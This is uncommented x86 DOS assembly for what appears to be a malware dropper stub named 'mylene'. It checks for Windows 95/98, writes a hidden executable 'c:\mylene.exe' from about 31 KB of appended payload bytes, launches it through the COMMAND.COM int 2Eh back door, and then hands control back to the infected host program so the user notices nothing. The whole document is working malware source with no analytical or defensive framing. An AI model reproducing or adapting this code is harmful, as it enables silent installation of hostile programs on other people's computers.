mylene_size = 31672

.model tiny
.code
    org 100h
start:
    .386 
    int 20h
    call $+3
delta:
    pop  si   
    sub  si, offset delta
    push ds cs
    pop  ds
    mov  ax, 1600h
    int  2fh
    cmp  al, 4 ; windows 95/98 
    jnz  _exit
    mov  ah, 3Ch
    mov  cx, 2 ; hidden & archive
    lea  dx, [si.file]
    int  21h
    jc   _exit
    xchg bx, ax
    mov  ah, 40h
    lea  dx, [si.100h-40h]
    mov  cx, mylene_size          
    int  21h
    mov  ah, 3eh
    int  21h
    mov  ax, es
    dec  ax
    mov  ds, ax
    mov  bx, ds:[3]
    push cs
    pop  ds
    push bx
    sub  bx, 1900h
    mov  ah, 4Ah
    int  21h
    jc   _exit
    mov  1 ptr [si.x?2], 0Dh
    pusha
    push es
    mov  2 ptr cs:[149h], sp
    mov  2 ptr cs:[147h], ss
    add  si, offset x?1
    int  2Eh
    mov  sp, 2 ptr cs:[149h]
    mov  ss, 2 ptr cs:[147h]
    pop  es
    popa
    push cs
    pop  ds
    pop  bx
    mov  ah, 4Ah
    int  21h
_exit:
    pop  ax
    add  si, 360h
    cli
    mov  ss, ax
    mov  sp, -2
    sti
    mov  di, 100h
    push di
    mov  cx, 0D8h
    cld
    rep  movsd
    pop  di
    push cx
    pop  cx
    mov  ds, ax
    mov  es, ax
    push ds di
    xor  ax, ax
    xor  bx, bx
    retf                      	    
x?1 db   0DH  
file db  'c:\mylene.exe'
x?2 db   ? 
end start